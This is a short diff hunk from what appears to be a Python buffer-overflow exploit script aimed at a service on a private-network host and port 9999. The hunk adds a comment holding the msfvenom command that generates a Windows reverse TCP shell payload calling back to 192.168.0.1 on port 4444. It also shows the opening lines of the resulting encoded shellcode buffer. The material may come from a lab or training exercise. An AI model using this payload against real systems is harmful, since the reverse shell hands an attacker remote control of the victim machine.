@@ -7,6 +7,7 @@ import sys
 host = "192.168.0.2"
 port = 9999
 
+# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -b "\x00" -f py
 buf =  ""
 buf += "\xbe\x97\x7c\x63\x8e\xdb\xc8\xd9\x74\x24\xf4\x5f\x2b"
 buf += "\xc9\xb1\x52\x31\x77\x12\x83\xef\xfc\x03\xe0\x72\x81"
